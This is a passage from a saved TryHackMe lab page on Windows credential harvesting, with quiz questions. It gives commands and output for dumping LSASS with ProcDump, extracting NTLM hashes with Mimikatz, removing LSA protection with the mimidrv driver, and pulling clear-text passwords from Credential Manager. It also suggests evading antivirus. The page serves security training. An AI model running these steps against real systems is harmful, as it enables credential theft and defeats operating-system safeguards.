data-pf_style_visibility="visible">Note:&nbsp;</b>if we try this on the provided VM, you should get an error the first time this is run, until we fix the registry value in the <b data-pf_style_display="inline" data-pf_style_visibility="visible">Protected LSASS</b> section later in this task.</p>
<p data-pf_style_display="block" data-pf_style_visibility="visible"></p>
<p style="text-align:left" data-pf_style_display="block" data-pf_style_visibility="visible">Copy the dumped process to the Mimikatz folder.</p>

<p data-pf_style_display="block" data-pf_style_visibility="visible">
</p><div class="terminal-container" data-pf_style_display="block" data-pf_style_visibility="visible">
    <div class="terminal-content" data-pf_style_display="block" data-pf_style_visibility="visible">
        <div class="terminal-top" data-pf_style_display="flex" data-pf_style_visibility="visible">
            Copying the LSASS Dumped file</div>
        <pre class="terminal-code language-markup" tabindex="0" data-pf_style_display="flex" data-pf_style_visibility="visible">           <code class=" language-markup" data-pf_style_display="block" data-pf_style_visibility="visible">C:\Users\Administrator&gt;copy C:\Users\ADMINI~1\AppData\Local\Temp\2\lsass.DMP C:\Tools\Mimikatz\lsass.DMP
        1 file(s) copied.</code>
        </pre>
    </div>
</div>
<p data-pf_style_display="block" data-pf_style_visibility="visible"></p>
<p style="text-align:left" data-pf_style_display="block" data-pf_style_visibility="visible"><span style="font-size:24px" data-pf_style_display="inline" data-pf_style_visibility="visible">Sysinternals Suite</span></p><p style="text-align:left" data-pf_style_display="block" data-pf_style_visibility="visible">An alternative way to dump a process if a GUI is not available to us is by using ProcDump. ProcDump is a Sysinternals process dump utility that runs from the command prompt. The SysInternals Suite is already installed in the provided machine at the following path: <code data-pf_style_display="inline-block" data-pf_style_visibility="visible">c:\Tools\SysinternalsSuite</code>&nbsp;</p><p style="text-align:left" data-pf_style_display="block" data-pf_style_visibility="visible">We can specify a running process, which in our case is lsass.exe, to be dumped as follows,</p>
<p data-pf_style_display="block" data-pf_style_visibility="visible">
</p><div class="terminal-container" data-pf_style_display="block" data-pf_style_visibility="visible">
    <div class="terminal-content" data-pf_style_display="block" data-pf_style_visibility="visible">
        <div class="terminal-top" data-pf_style_display="flex" data-pf_style_visibility="visible">
            Dumping the LSASS Process using procdump.exe&nbsp;</div>
        <pre class="terminal-code language-markup" tabindex="0" data-pf_style_display="flex" data-pf_style_visibility="visible">           <code class=" language-markup" data-pf_style_display="block" data-pf_style_visibility="visible">c:\&gt;c:\Tools\SysinternalsSuite\procdump.exe -accepteula -ma lsass.exe c:\Tools\Mimikatz\lsass_dump

ProcDump v10.0 - Sysinternals process dump utility
Copyright (C) 2009-2020 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

[09:09:33] Dump 1 initiated: c:\Tools\Mimikatz\lsass_dump-1.dmp
[09:09:33] Dump 1 writing: Estimated dump file size is 162 MB.
[09:09:34] Dump 1 complete: 163 MB written in 0.4 seconds
[09:09:34] Dump count reached.</code>
        </pre>
    </div>
</div>

<p data-pf_style_display="block" data-pf_style_visibility="visible">Note that the dump process is writing to disk. Dumping the LSASS process is a known technique used by adversaries. Thus, AV products may flag it as malicious. In the real world, you may be more creative and write code to encrypt or implement a method to bypass AV products.<br data-pf_style_display="inline" data-pf_style_visibility="visible"></p><p data-pf_style_display="block" data-pf_style_visibility="visible"><span style="font-size:24px" data-pf_style_display="inline" data-pf_style_visibility="visible">MimiKatz</span></p><p data-pf_style_display="block" data-pf_style_visibility="visible"><a href="https://github.com/gentilkiwi/mimikatz" target="_blank" data-pf_style_display="inline" data-pf_style_visibility="visible">Mimikatz </a>is a well-known tool used for extracting passwords, hashes, PINs, and Kerberos tickets from memory using various techniques. Mimikatz<span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">&nbsp;is a post-exploitation tool that enables&nbsp;</span>other useful attacks<span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">, such as&nbsp;</span>pass-the-hash, pass-the-ticket, or building Golden Kerberos tickets<span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">. Mimikatz deals with operating system memory to access information. Thus,&nbsp;</span><span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">it requires administrator and system privileges in order to dump memory and extract credentials.</span></p><p data-pf_style_display="block" data-pf_style_visibility="visible">We will be using the&nbsp;<code data-pf_style_display="inline-block" data-pf_style_visibility="visible">Mimikatz</code>&nbsp;tool to extract the memory dump of the lsass.exe process.&nbsp;We have provided the necessary tools for you, and they can be found at<span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">: </span><code data-pf_style_display="inline-block" data-pf_style_visibility="visible">c:\Tools\Mimikatz</code><span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">.</span></p><p data-pf_style_display="block" data-pf_style_visibility="visible"><span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">Remember that the LSASS process is running as a SYSTEM. Thus in order to access users' hashes, we need a system or local administrator permissions. Thus, open the command prompt and run it as administrator. Then, execute the mimikatz binary as follows,</span></p><p data-pf_style_display="block" data-pf_style_visibility="visible"></p><div class="terminal-container" data-pf_style_display="block" data-pf_style_visibility="visible">
    <div class="terminal-content" data-pf_style_display="block" data-pf_style_visibility="visible">
        <div class="terminal-top" data-pf_style_display="flex" data-pf_style_visibility="visible">
            Runing mimikatz With Admin Privielges</div>
        <pre class="terminal-code language-markup" tabindex="0" data-pf_style_display="flex" data-pf_style_visibility="visible">           <code class=" language-markup" data-pf_style_display="block" data-pf_style_visibility="visible">C:\Tools\Mimikatz&gt; mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #18362 Jul 10 2019 23:09:43
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        &gt; http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # </code>
        </pre>
    </div>
</div><p data-pf_style_display="block" data-pf_style_visibility="visible"></p>
<p data-pf_style_display="block" data-pf_style_visibility="visible">Before dumping the memory for cashed credentials and hashes,<span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">&nbsp;</span><span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">we need to enable the SeDebugPrivilege and check the current permissions for memory access. It can be done by executing&nbsp;</span><code data-pf_style_display="inline-block" data-pf_style_visibility="visible">privilege::debug</code> command as follows,</p>
<p data-pf_style_display="block" data-pf_style_visibility="visible"></p><div class="terminal-container" data-pf_style_display="block" data-pf_style_visibility="visible">
    <div class="terminal-content" data-pf_style_display="block" data-pf_style_visibility="visible">
        <div class="terminal-top" data-pf_style_display="flex" data-pf_style_visibility="visible">
            Checking the Current Permission to Access Memory&nbsp;</div>
        <pre class="terminal-code language-markup" tabindex="0" data-pf_style_display="flex" data-pf_style_visibility="visible">           <code class=" language-markup" data-pf_style_display="block" data-pf_style_visibility="visible">mimikatz # privilege::debug
Privilege '20' OK</code>
        </pre>
    </div>
</div><p data-pf_style_display="block" data-pf_style_visibility="visible"></p>
<p data-pf_style_display="block" data-pf_style_visibility="visible">Once the privileges are given, we can access the memory to dump all cached passwords and hashes from the <code data-pf_style_display="inline-block" data-pf_style_visibility="visible">lsass.exe</code> process using <code data-pf_style_display="inline-block" data-pf_style_visibility="visible">sekurlsa::logonpasswords</code>. If we try this on the provided VM, it will not work until we fix it in the next section.</p>
<p data-pf_style_display="block" data-pf_style_visibility="visible">
</p><div class="terminal-container" data-pf_style_display="block" data-pf_style_visibility="visible">
    <div class="terminal-content" data-pf_style_display="block" data-pf_style_visibility="visible">
        <div class="terminal-top" data-pf_style_display="flex" data-pf_style_visibility="visible">
            Dumping the Stored Clear-text Passwords</div>
        <pre class="terminal-code language-markup" tabindex="0" data-pf_style_display="flex" data-pf_style_visibility="visible">           <code class=" language-markup" data-pf_style_display="block" data-pf_style_visibility="visible">mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 515377 (00000000:0007dd31)
Session           : RemoteInteractive from 3
User Name         : Administrator
Domain            : THM
Logon Server      : CREDS-HARVESTIN
Logon Time        : 6/3/2022 8:30:44 AM
SID               : S-1-5-21-1966530601-3185510712-10604624-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : THM
         * NTLM     : 98d3a787a80d08385cea7fb4aa2a4261
         * SHA1     : 64a137cb8178b7700e6cffa387f4240043192e72
         * DPAPI    : bc355c6ce366fdd4fd91b54260f9cf70
...</code>
        </pre>
    </div>
</div><p data-pf_style_display="block" data-pf_style_visibility="visible"></p>
<p data-pf_style_display="block" data-pf_style_visibility="visible">Mimikatz lists a lot of information about accounts and machines. If we check closely in the Primary section for Administrator users, we can see that we have an NTLM hash.&nbsp;</p><p data-pf_style_display="block" data-pf_style_visibility="visible"><b data-pf_style_display="inline" data-pf_style_visibility="visible">Note </b>to get users' hashes, a user (victim) must have logged in to a system, and the user's credentials have been cached.</p><p data-pf_style_display="block" data-pf_style_visibility="visible"><span style="font-size:24px" data-pf_style_display="inline" data-pf_style_visibility="visible">Protected LSASS</span></p><p data-pf_style_display="block" data-pf_style_visibility="visible"><span style="font-size:16px" data-pf_style_display="inline" data-pf_style_visibility="visible">In 2012, Microsoft implemented an LSA protection, to keep LSASS from being accessed to extract credentials from memory. This task will show how to disable the LSA protection and dump credentials from memory using Mimikatz. To enable LSASS protection, we can modify the registry RunAsPPL DWORD value in&nbsp;</span><code data-pf_style_display="inline-block" data-pf_style_visibility="visible">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa</code><span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">&nbsp;to 1.</span></p><p data-pf_style_display="block" data-pf_style_visibility="visible"><span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">The steps are similar to the previous section, which runs the Mimikatz execution file with admin privileges and enables the debug mode. If the LSA protection is enabled, we will get an error executing the "sekurlsa::logonpasswords" command.</span></p><p data-pf_style_display="block" data-pf_style_visibility="visible"><span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible"></span></p><div class="terminal-container" data-pf_style_display="block" data-pf_style_visibility="visible">
    <div class="terminal-content" data-pf_style_display="block" data-pf_style_visibility="visible">
        <div class="terminal-top" data-pf_style_display="flex" data-pf_style_visibility="visible">
            Failing to Dump Stored Password Due to the LSA Protection</div>
        <pre class="terminal-code language-markup" tabindex="0" data-pf_style_display="flex" data-pf_style_visibility="visible">           <code class=" language-markup" data-pf_style_display="block" data-pf_style_visibility="visible">mimikatz # sekurlsa::logonpasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)</code>
        </pre>
    </div>
</div>The command returns a 0x00000005 error code message (Access Denied).&nbsp;<span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">Lucky for us, Mimikatz provides a mimidrv.sys driver that works on kernel level to disable the LSA protection. We can import it to Mimikatz by executing "!+" as follows,</span><p data-pf_style_display="block" data-pf_style_visibility="visible"></p><p data-pf_style_display="block" data-pf_style_visibility="visible"><span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible"></span></p><div class="terminal-container" data-pf_style_display="block" data-pf_style_visibility="visible">
    <div class="terminal-content" data-pf_style_display="block" data-pf_style_visibility="visible">
        <div class="terminal-top" data-pf_style_display="flex" data-pf_style_visibility="visible">
            Loading the mimidrv Driver into Memory</div>
        <pre class="terminal-code language-markup" tabindex="0" data-pf_style_display="flex" data-pf_style_visibility="visible">           <code class=" language-markup" data-pf_style_display="block" data-pf_style_visibility="visible">mimikatz # !+
[*] 'mimidrv' service not present
[+] 'mimidrv' service successfully registered
[+] 'mimidrv' service ACL to everyone
[+] 'mimidrv' service started</code>
        </pre>
    </div>
</div><p data-pf_style_display="block" data-pf_style_visibility="visible"></p>
<p data-pf_style_display="block" data-pf_style_visibility="visible">Note: If this fails with an <code data-pf_style_display="inline-block" data-pf_style_visibility="visible">isFileExist</code> error, exit mimikatz, navigate to <code data-pf_style_display="inline-block" data-pf_style_visibility="visible">C:\Tools\Mimikatz\</code> and run the command again.<br data-pf_style_display="inline" data-pf_style_visibility="visible"><br data-pf_style_display="inline" data-pf_style_visibility="visible">Once the driver is loaded, we can disable the LSA protection by executing the following Mimikatz command:</p>
<p data-pf_style_display="block" data-pf_style_visibility="visible"></p><div class="terminal-container" data-pf_style_display="block" data-pf_style_visibility="visible">
    <div class="terminal-content" data-pf_style_display="block" data-pf_style_visibility="visible">
        <div class="terminal-top" data-pf_style_display="flex" data-pf_style_visibility="visible">
            Removing the LSA Protection</div>
        <pre class="terminal-code language-markup" tabindex="0" data-pf_style_display="flex" data-pf_style_visibility="visible">           <code class=" language-markup" data-pf_style_display="block" data-pf_style_visibility="visible">mimikatz # !processprotect /process:lsass.exe /remove
Process : lsass.exe
PID 528 -&gt; 00/00 [0-0-0]</code>
        </pre>
    </div>
</div><p data-pf_style_display="block" data-pf_style_visibility="visible"></p>
<p data-pf_style_display="block" data-pf_style_visibility="visible">Now, if we try to run the "sekurlsa::logonpasswords" command again, it must be executed successfully and show cached credentials in memory.<br data-pf_style_display="inline" data-pf_style_visibility="visible"></p>
<p data-pf_style_display="block" data-pf_style_visibility="visible"></p></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom red" data-pf_style_display="flex" data-pf_style_visibility="visible">
            <div data-pf_style_display="block" data-pf_style_visibility="visible">Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions" data-pf_style_display="flex" data-pf_style_visibility="visible">
                            <div class="room-task-question-no vertical-align-custom" data-pf_style_display="flex" data-pf_style_visibility="visible">
                                
                            </div>
                            <div class="room-task-question-details" data-pf_style_display="block" data-pf_style_visibility="visible">
                                Is the LSA protection enabled? (Y|N)
                            </div>
                        </div>

                    <div class="room-task-input" data-pf_style_display="grid" data-pf_style_visibility="visible">
                        <div class="room-task-input-questions" data-pf_style_display="flex" data-pf_style_visibility="visible">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: *" value="" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <input type="hidden" value="1" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
                            <input type="hidden" value="5" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
                        </div>
                        <div class="room-task-input-answer" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <button type="button" class="btn btn-outline-success task-answer" onclick="answerQuestion(this)" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <i class="far fa-paper-plane" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i> Submit
                        </button>
                        </div>
                        
                    </div><div class="room-task-questions" data-pf_style_display="flex" data-pf_style_visibility="visible">
                            <div class="room-task-question-no vertical-align-custom" data-pf_style_display="flex" data-pf_style_visibility="visible">
                                
                            </div>
                            <div class="room-task-question-details" data-pf_style_display="block" data-pf_style_visibility="visible">
                                <p data-pf_style_display="block" data-pf_style_visibility="visible">If yes, try removing the protection and dumping the memory using Mimikatz. Once you have done, hit Complete.</p>
                            </div>
                        </div>

                    <div class="room-task-input" data-pf_style_display="grid" data-pf_style_visibility="visible">
                        <div class="room-task-input-questions" data-pf_style_display="flex" data-pf_style_visibility="visible">
                            <input type="text" class="form-control room-answer-field" placeholder="No answer needed" value="" disabled="" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <input type="hidden" value="2" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
                            <input type="hidden" value="5" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
                        </div>
                        <div class="room-task-input-answer" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <button type="button" class="btn btn-outline-success task-answer" onclick="answerQuestion(this)" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <i class="far fa-paper-plane" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i> Completed
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-6" data-pf_style_display="flex" data-pf_style_visibility="visible">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse6" data-pf_style_display="block" data-pf_style_visibility="visible">
                        <a class="card-link" data-pf_style_display="inline" data-pf_style_visibility="visible">
                            <span class="task-dropdown-title red" data-pf_style_display="inline" data-pf_style_visibility="visible">Task 6                             <span class="task-dropdown-icon" data-pf_style_display="inline" data-pf_style_visibility="visible"><i class="far fa-circle text-lgray" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i></span></span> Windows Credential Manager
                            <span class="float-right" data-pf_style_display="block" data-pf_style_visibility="visible"><i class="fas fa-chevron-down" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i></span>
                            <span class="task-resources" data-pf_style_display="block" data-pf_style_visibility="visible"></span>
                        </a>
                    </div>
                    <div id="collapse6" class="collapse show" data-parent="#taskContent" data-pf_style_display="block" data-pf_style_visibility="visible">
                        <div class="card-body task-incomplete" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <div class="room-task-desc" data-pf_style_display="flex" data-pf_style_visibility="visible">
            <div class="room-task-desc-data" data-pf_style_display="block" data-pf_style_visibility="visible"> <p data-pf_style_display="block" data-pf_style_visibility="visible"></p><p data-pf_style_display="block" data-pf_style_visibility="visible"></p><p data-pf_style_display="block" data-pf_style_visibility="visible"><span style="font-size:16px" data-pf_style_display="inline" data-pf_style_visibility="visible">This task introduces the Windows Credential Manager and discusses the technique used for dumping system credentials by exploiting it.</span></p><p data-pf_style_display="block" data-pf_style_visibility="visible"><span style="font-size:24px" data-pf_style_display="inline" data-pf_style_visibility="visible">What is Credentials Manager?</span></p><p data-pf_style_display="block" data-pf_style_visibility="visible">Credential Manager is a Windows feature that stores logon-sensitive information for websites, applications, and networks. It contains login credentials such as usernames, passwords, and internet addresses. There are four credential categories:</p><ul data-pf_style_display="block" data-pf_style_visibility="visible"><li data-pf_style_display="list-item" data-pf_style_visibility="visible">Web credentials contain authentication details stored in Internet browsers or other applications.</li><li data-pf_style_display="list-item" data-pf_style_visibility="visible">Windows credentials contain Windows authentication details, such as NTLM or Kerberos.</li><li data-pf_style_display="list-item" data-pf_style_visibility="visible">Generic credentials contain basic authentication details, such as clear-text usernames and passwords.</li><li data-pf_style_display="list-item" data-pf_style_visibility="visible">Certificate-based credentials: Athunticated details based on certifications.</li></ul><p data-pf_style_display="block" data-pf_style_visibility="visible">Note that authentication details are stored on the user's folder and are not shared among Windows user accounts. However, they are cached in memory.</p><p data-pf_style_display="block" data-pf_style_visibility="visible"><span style="font-size:24px" data-pf_style_display="inline" data-pf_style_visibility="visible">Accessing Credential Manager</span><br data-pf_style_display="inline" data-pf_style_visibility="visible"></p><p data-pf_style_display="block" data-pf_style_visibility="visible">We can access the Windows Credential Manager through GUI (Control Panel -&gt; User Accounts -&gt; Credential Manager) or the command prompt. In this task, the focus will be more on the command prompt scenario where the GUI is not available.</p><p style="text-align:center" data-pf_style_display="block" data-pf_style_visibility="visible"><img src="./TryHackMe _ Credentials Harvesting_files/2ee895dc640303b236e795c1f7e5df7a.png" alt="Windows Credential Manager" data-pf_style_display="inline" data-pf_style_visibility="visible" data-pf_rect_width="904" data-pf_rect_height="388" class="pf-large-image"><br data-pf_style_display="inline" data-pf_style_visibility="visible"></p><p data-pf_style_display="block" data-pf_style_visibility="visible">We will be using the Microsoft Credentials Manager&nbsp;<code data-pf_style_display="inline-block" data-pf_style_visibility="visible">vaultcmd</code> utility. Let's start to enumerate if there are any stored credentials. First, we list the current windows vaults available in the Windows target.&nbsp;</p><p data-pf_style_display="block" data-pf_style_visibility="visible"></p><div class="terminal-container" data-pf_style_display="block" data-pf_style_visibility="visible">
    <div class="terminal-content" data-pf_style_display="block" data-pf_style_visibility="visible">
        <div class="terminal-top" data-pf_style_display="flex" data-pf_style_visibility="visible">
            Listing the Available Credentials from the Credentials Manager</div>
        <pre class="terminal-code language-markup" tabindex="0" data-pf_style_display="flex" data-pf_style_visibility="visible">           <code class=" language-markup" data-pf_style_display="block" data-pf_style_visibility="visible">C:\Users\Administrator&gt;vaultcmd /list
Currently loaded vaults:
        Vault: Web Credentials
        Vault Guid:4BF4C442-9B8A-41A0-B380-DD4A704DDB28
        Location: C:\Users\Administrator\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28

        Vault: Windows Credentials
        Vault Guid:77BC582B-F0A6-4E15-4E80-61736B6F3B29
        Location: C:\Users\Administrator\AppData\Local\Microsoft\Vault</code>
        </pre>
    </div>
</div><p data-pf_style_display="block" data-pf_style_visibility="visible"></p><p data-pf_style_display="block" data-pf_style_visibility="visible">By default, Windows has two vaults, one for Web and the other one for Windows machine credentials. The above output confirms that we have the two default vaults.</p><p data-pf_style_display="block" data-pf_style_visibility="visible">Let's check if there are any stored credentials in the Web Credentials vault by running the vaultcmd command with <code data-pf_style_display="inline-block" data-pf_style_visibility="visible">/listproperties</code>.</p>

<p data-pf_style_display="block" data-pf_style_visibility="visible"></p><div class="terminal-container" data-pf_style_display="block" data-pf_style_visibility="visible">
    <div class="terminal-content" data-pf_style_display="block" data-pf_style_visibility="visible">
        <div class="terminal-top" data-pf_style_display="flex" data-pf_style_visibility="visible">Checking if there Are any Stored Credentials in the "Web Credentials."</div>
        <pre class="terminal-code language-markup" tabindex="0" data-pf_style_display="flex" data-pf_style_visibility="visible">           <code class=" language-markup" data-pf_style_display="block" data-pf_style_visibility="visible">C:\Users\Administrator&gt;VaultCmd /listproperties:"Web Credentials"
Vault Properties: Web Credentials
Location: C:\Users\Administrator\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28
Number of credentials: 1
Current protection method: DPAPI</code>
        </pre>
    </div>
</div><p data-pf_style_display="block" data-pf_style_visibility="visible"></p>



<p data-pf_style_display="block" data-pf_style_visibility="visible">The output shows that we have one stored credential in the specified vault. Now let's try to list more information about the stored credential as follows,</p><p data-pf_style_display="block" data-pf_style_visibility="visible"></p><div class="terminal-container" data-pf_style_display="block" data-pf_style_visibility="visible">
    <div class="terminal-content" data-pf_style_display="block" data-pf_style_visibility="visible">
        <div class="terminal-top" data-pf_style_display="flex" data-pf_style_visibility="visible">
            Listing Credentials Details for "Web Credentials"</div>
        <pre class="terminal-code language-markup" tabindex="0" data-pf_style_display="flex" data-pf_style_visibility="visible">           <code class=" language-markup" data-pf_style_display="block" data-pf_style_visibility="visible">C:\Users\Administrator&gt;VaultCmd /listcreds:"Web Credentials"
Credentials in vault: Web Credentials

Credential schema: Windows Web Password Credential
Resource: internal-app.thm.red
Identity: THMUser Saved By: MSEdge
Hidden: No
Roaming: Yes</code>
        </pre>
    </div>
</div><p data-pf_style_display="block" data-pf_style_visibility="visible"></p><p data-pf_style_display="block" data-pf_style_visibility="visible"><span style="font-size:24px" data-pf_style_display="inline" data-pf_style_visibility="visible">Credential Dumping</span><br data-pf_style_display="inline" data-pf_style_visibility="visible"></p><p data-pf_style_display="block" data-pf_style_visibility="visible">The VaultCmd is not able to show the password, but we can rely on other PowerShell Scripts such as <a href="https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1" target="_blank" data-pf_style_display="inline" data-pf_style_visibility="visible">Get-WebCredentials.ps1</a>,&nbsp;which is already included in the attached VM.</p><p data-pf_style_display="block" data-pf_style_visibility="visible">Ensure to execute PowerShell with bypass policy to import it as a module as follows,</p><p data-pf_style_display="block" data-pf_style_visibility="visible"></p><div class="terminal-container" data-pf_style_display="block" data-pf_style_visibility="visible">
    <div class="terminal-content" data-pf_style_display="block" data-pf_style_visibility="visible">
        <div class="terminal-top" data-pf_style_display="flex" data-pf_style_visibility="visible">
            Getting Clean-text Password from Web Credentials</div>
        <pre class="terminal-code language-markup" tabindex="0" data-pf_style_display="flex" data-pf_style_visibility="visible">           <code class=" language-markup" data-pf_style_display="block" data-pf_style_visibility="visible">C:\Users\Administrator&gt;powershell -ex bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator&gt; Import-Module C:\Tools\Get-WebCredentials.ps1
PS C:\Users\Administrator&gt; Get-WebCredentials

UserName  Resource             Password     Properties
--------  --------             --------     ----------
THMUser internal-app.thm.red Password! {[hidden, False], [applicationid, 00000000-0000-0000-0000-000000000000], [application, MSEdge]}</code>
        </pre>
    </div>
</div><p data-pf_style_display="block" data-pf_style_visibility="visible"></p><p data-pf_style_display="block" data-pf_style_visibility="visible">The output shows that we obtained the username and password for accessing the internal application.</p><p data-pf_style_display="block" data-pf_style_visibility="visible"><span style="font-size:24px" data-pf_style_display="inline" data-pf_style_visibility="visible">RunAs</span></p><p data-pf_style_display="block" data-pf_style_visibility="visible">An alternative method of taking advantage of stored credentials is by using RunAs. RunAs is a command-line built-in tool that allows running Windows applications or tools under different users' permissions. The RunAs&nbsp;tool has various command arguments that could be used in the Windows system. The <code data-pf_style_display="inline-block" data-pf_style_visibility="visible">/savecred</code> argument allows you to save the credentials of the user in Windows Credentials Manager (under the Windows Credentials section). So, the next time we execute as the same user, runas will not ask for a password.</p><p data-pf_style_display="block" data-pf_style_visibility="visible"><span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">Let's apply it to the attached Windows machine. Another way to enumerate stored credentials is by using </span><code data-pf_style_display="inline-block" data-pf_style_visibility="visible">cmdkey</code><span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">, which is a tool to create, delete, and display stored Windows credentials. By providing the </span><code data-pf_style_display="inline-block" data-pf_style_visibility="visible">/list</code><span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible"> argument, we can show all stored credentials, or we can specify the credential to display more details </span><code data-pf_style_display="inline-block" data-pf_style_visibility="visible">/list:computername</code><span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">.</span></p><p data-pf_style_display="block" data-pf_style_visibility="visible"><span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible"></span></p><div class="terminal-container" data-pf_style_display="block" data-pf_style_visibility="visible">
    <div class="terminal-content" data-pf_style_display="block" data-pf_style_visibility="visible">
        <div class="terminal-top" data-pf_style_display="flex" data-pf_style_visibility="visible">
            Enumerating for Stored Windows Credentials</div>
        <pre class="terminal-code language-markup" tabindex="0" data-pf_style_display="flex" data-pf_style_visibility="visible">           <code class=" language-markup" data-pf_style_display="block" data-pf_style_visibility="visible">C:\Users\thm&gt;cmdkey /list

Currently stored credentials:

    Target: Domain:interactive=thm\thm-local
    Type: Domain Password
    User: thm\thm-local</code>
        </pre>
    </div>
</div>The output shows that we have a domain password stored as the <code data-pf_style_display="inline-block" data-pf_style_visibility="visible">thm\thm-local</code> user.&nbsp;<span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">Note that stored credentials could be for other servers too.&nbsp;</span><span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">Now let's use runas to execute Windows applications as the </span><code data-pf_style_display="inline-block" data-pf_style_visibility="visible">thm-local</code><span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible"> user.&nbsp;</span><p data-pf_style_display="block" data-pf_style_visibility="visible"></p><p data-pf_style_display="block" data-pf_style_visibility="visible"></p><div class="terminal-container" data-pf_style_display="block" data-pf_style_visibility="visible">
    <div class="terminal-content" data-pf_style_display="block" data-pf_style_visibility="visible">
        <div class="terminal-top" data-pf_style_display="flex" data-pf_style_visibility="visible">
            Run CMD.exe As a User with the /savecred argument</div>
        <pre class="terminal-code language-markup" tabindex="0" data-pf_style_display="flex" data-pf_style_visibility="visible">           <code class=" language-markup" data-pf_style_display="block" data-pf_style_visibility="visible">C:\Users\thm&gt;runas /savecred /user:THM.red\thm-local cmd.exe
Attempting to start cmd.exe as user "THM.red\thm-local" ...</code>
        </pre>
    </div>
</div>A new cmd.exe pops up with a command prompt ready to use. Now run the whoami command to confirm that we are running under the desired user. There is a flag in the <code data-pf_style_display="inline-block" data-pf_style_visibility="visible">c:\Users\thm-local\Saved Games\flag.txt</code>, try to read it and answer the question below.<br data-pf_style_display="inline" data-pf_style_visibility="visible"><p data-pf_style_display="block" data-pf_style_visibility="visible"></p><p data-pf_style_display="block" data-pf_style_visibility="visible"><span style="font-size:24px" data-pf_style_display="inline" data-pf_style_visibility="visible">Mimikatz</span></p><p data-pf_style_display="block" data-pf_style_visibility="visible">Mimikatz is a tool that can dump clear-text passwords stored in the Credential Manager from memory. The steps are similar to those shown in the previous section (Memory dump), but we can specify to show the credentials manager section only this time.</p><p data-pf_style_display="block" data-pf_style_visibility="visible"></p><div class="terminal-container" data-pf_style_display="block" data-pf_style_visibility="visible">
    <div class="terminal-content" data-pf_style_display="block" data-pf_style_visibility="visible">
        <div class="terminal-top" data-pf_style_display="flex" data-pf_style_visibility="visible">Dumping Memory for Credentials Manager</div>
        <pre class="terminal-code language-markup" tabindex="0" data-pf_style_display="flex" data-pf_style_visibility="visible">           <code class=" language-markup" data-pf_style_display="block" data-pf_style_visibility="visible">C:\Users\Administrator&gt;c:\Tools\Mimikatz\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 May 19 2020 00:48:59
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        &gt; http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::credman</code>
        </pre>
    </div>
